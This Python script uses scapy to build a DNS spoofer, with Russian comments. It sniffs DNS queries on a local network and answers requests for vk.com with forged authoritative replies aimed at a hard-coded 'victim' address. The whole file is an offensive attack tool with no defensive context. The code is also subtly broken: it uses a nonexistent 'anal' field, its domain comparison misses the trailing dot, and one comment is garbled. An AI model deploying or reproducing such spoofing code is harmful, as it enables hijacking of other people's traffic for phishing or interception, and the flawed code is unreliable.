from scapy.all import IP, UDP, DNS, DNSRR, send, sniff
import logging

class DNSSpoofer:
    def __init__(self, victim_ip, dns_server_ip, spoofed_domain, spoofed_ip, interface='en0'):
        self.victim_ip = victim_ip
        self.dns_server_ip = dns_server_ip
        self.spoofed_domain = spoofed_domain
        self.spoofed_ip = spoofed_ip
        self.interface = interface
        logging.basicConfig(level=logging.INFO)

    def run(self):
        logging.info(f'Starting DNS Spoofing for {self.spoofed_domain} targeting {self.victim_ip}')
        sniff(iface=self.interface, filter='udp port 53', prn=self.sniff_dns)

    def sniff_dns(self, packet):
        if DNS in packet and packet[DNS].qr == 0:  # Это запрос
            query_domain = packet[DNS].qd.qname.decode()
            if query_domain == self.spoofed_domain:
                logging.info(f'Spoofing DNS request for: {query_domain}')
                self.payload = self.create_dns_response(packet)
                send(self.payload, iface=self.interface)

    def create_dns_response(self, request):
        # Создание DNS ответа
        dns_response = IP(src=self.dns_server_ip, dst=request[IP].src) / \
                       UDP(sport=53, dport=request[UDP].sport) / \
                       DNS(id=request[DNS].id, qr=1, aa=1, qd=request[DNS].qd, 
                           anal=DNSRR(rrname=self.spoofed_domain, rdata=self.spoofed_ip, ttl=10))
        return dns_response

if __name__ == "__main__":
    VICTIM_IP = '192.168.0.100'  # IP-адрес жертвы
    DNS_SERVER_IP = '127.0.0.1'  # IP-адрес вашего DNS сервера
    SPOOFED_DOMAIN = 'vk.com'  # Домен, для которого вы хотите подменить персонал
    SPOOFED_IP = '0.0.0.0'  # IP, на который будет перенаправлен запрос

    spoofer = DNSSpoofer(VICTIM_IP, DNS_SERVER_IP, SPOOFED_DOMAIN, SPOOFED_IP)
    spoofer.run()
